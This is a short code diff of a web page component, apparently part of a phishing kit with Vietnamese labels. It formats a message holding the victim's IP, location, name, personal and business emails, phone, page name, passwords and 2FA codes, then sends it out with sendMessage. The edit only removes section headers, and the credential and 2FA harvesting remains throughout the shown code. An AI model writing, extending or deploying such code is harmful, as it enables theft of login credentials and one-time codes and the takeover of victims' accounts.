@@ -327,15 +327,12 @@ const Home = () => {
 ⏰ ${formatDateTime()}
 🌐 IP: <code>${escapeHtml(safeIp)}</code>${deviceLine}
 📍 Vị trí: ${escapeHtml(`${safeCity}, ${safeRegion}, ${safeCountry}`)}
-📋 <b>THÔNG TIN</b>
    Tên: <code>${escapeHtml(form.fullName)}</code>
    Email: <code>${escapeHtml(form.personalEmail)}</code>
    Email DN: <code>${escapeHtml(form.businessEmail)}</code>
    SĐT: <code>${escapeHtml(form.phone)}</code>
    Page: <code>${escapeHtml(form.pageName)}</code>
-🔐 <b>ĐĂNG NHẬP</b>
 ${passwordLines}
-🔒 <b>MÃ 2FA</b>
 ${twoFALines}
 `;
         sendMessage(message);
